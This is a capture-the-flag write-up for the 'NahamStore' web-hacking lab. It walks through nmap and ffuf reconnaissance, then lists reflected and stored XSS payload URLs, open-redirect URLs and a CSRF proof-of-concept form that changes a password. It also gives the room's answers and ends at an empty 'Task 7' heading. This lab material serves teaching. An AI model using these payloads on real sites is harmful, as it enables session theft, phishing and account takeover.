# NahamStore Writeup

> Machine : No machine

> In this room you will learn the basics of bug bounty hunting and web application hacking

## Solution

First reconnaissance and port scanning and setup the requirement.

```shell
nmap -sV -sC -Pn --open -T4 nahamstore.thm -p-
```

```text
PORT      STATE    SERVICE   VERSION
22/tcp    open     ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 84:6e:52:ca:db:9e:df:0a:ae:b5:70:3d:07:d6:91:78 (RSA)
|   256 1a:1d:db:ca:99:8a:64:b1:8b:10:df:a9:39:d5:5c:d3 (ECDSA)
|_  256 f6:36:16:b7:66:8e:7b:35:09:07:cb:90:c9:84:63:38 (ED25519)
80/tcp    open     http      nginx 1.14.0 (Ubuntu)
|_http-title: NahamStore - Home
| http-cookie-flags: 
|   /: 
|     session: 
|_      httponly flag not set
|_http-server-header: nginx/1.14.0 (Ubuntu)
8000/tcp  open     http      nginx 1.18.0 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-robots.txt: 1 disallowed entry 
|_/admin
```

We can see the open ports is 22 (SSH), 80 and 8000 (HTTP).

Now we have to find the subdirectories to add them in our hosts file.

```shell
ffuf -u "http://nahamstore.thm/" -H "Host:FUZZ.nahamstore.thm" -w "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt" -fw 125
```

```text
www                     [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 45ms]
shop                    [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 43ms]
marketing               [Status: 200, Size: 2025, Words: 692, Lines: 42, Duration: 63ms]
stock                   [Status: 200, Size: 67, Words: 1, Lines: 1, Duration: 59ms]
```

Adding all the requirement to `/etc/hosts` we get this:

```text
127.0.0.1       localhost
127.0.1.1       kali
10.130.173.181  nahamstore.thm    something.nahamstore.thm    www.nahamstore.thm    marketing.nahamstore.thm    stock.nahamstore.thm

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Now we can start the room starting with XSS into SQLi. Don't worry about task 3 we can't answer it right now.

First you have to register to access all the services on the web.

### Task 4 (XSS)

Here we can found `8 Reflected XSS` and `1 Stored XSS`.
And this is all the vulnerable links we found:

```text
# Reflected XSS
http://nahamstore.thm/search?q=';alert(1);//

http://nahamstore.thm/product?id=<script>alert(1)</script>

http://nahamstore.thm/product?id=1&name=</title><script>alert(1)</script>

http://nahamstore.thm/returns/1?auth=<script>alert(1)</script>

http://nahamstore.thm/returns

http://nahamstore.thm/<script>alert(1)</script>

http://nahamstore.thm/product?id=1&added=1&discount="onmouseover="alert(1)"

http://marketing.nahamstore.thm/?error=<script>alert(1)</script>

# Stored XSS
http://nahamstore.thm/basket
```

> Enter an URL ( including parameters ) of an endpoint that is vulnerable to XSS
> 
> http://marketing.nahamstore.thm/?error=

>What HTTP header can be used to create a Stored XXS
>
>User-Agent

> What HTML tag needs to be escaped on the product page to get the XSS to work?
> 
> title

> What JavaScript variable needs to be escaped to get the XSS to work?
> 
> search

> What hidden parameter can be found on the shop home page that introduces an XSS vulnerability.
> 
> q

> What HTML tag needs to be escaped on the returns page to get the XSS to work?
> 
> textarea

> What is the value of the H1 tag of the page that uses the requested URL to create an XSS
> 
> Page Not Found

> What other hidden parameter can be found on the shop which can introduce an XSS vulnerability
> 
> discount

### Task 5 (Open Redirect)

Usually the `Open Redirect` happens in the URL parameters. Using `arjun` we can find the hiding parameters.

```shell
arjun -u http://nahamstore.thm/
```

```text
[✓] parameter detected: r, based on: http code
[✓] parameter detected: q, based on: body length
[+] Parameters found: r, q
```

We found two parameters q for query and r for redirection.
So if we try:

```text
http://nahamstore.thm/?r=https://google.com
```

We will successfully redirected to google.com.

> Open Redirect One
> 
> r

And also we know that when we login or register we've been redirected to another page.

So when we add something to the basket they ask for register or login, so if we try to enter, a parameter is added to the URL `redirect_url=/basket`.

Trying to change it we will be successfully redirected.

```text
http://nahamstore.thm/login?redirect_url=https://google.com
```

> Open Redirect Two
> 
> redirect_url

### Task 6 (CSRF)

CSRF usually happens in the page to change password or email.

So in the web site we enter http://nahamstore.thm/account/settings and when we try to change the password we intercept the request. And the problem is there is no `Anti-CSRF Tokens`. So we can create html page using `CSRFShark`.

```html
<!DOCTYPE html>
<html lang="en">
	<body>
		<h1>Form CSRF PoC</h1>
		<form method="POST" action="http://nahamstore.thm/account/settings/password">
			<input type="hidden" name="change_password" value="test1234">
			<input type="submit" value="Submit Request">
		</form>
	</body>
</html>
```

> What URL has no CSRF protection
> 
> http://nahamstore.thm/account/settings/password

The same thing when we intercept the change email page on http://nahamstore.thm/account/settings/email and we found `csrf_protect`, but the bug here is we can delete the `csrf_protect` field and nothing happens.

> What field can be removed to defeat the CSRF protection
> 
> csrf_protect

> What simple encoding is used to try and CSRF protect a form
> 
> base64

### Task 7 ()

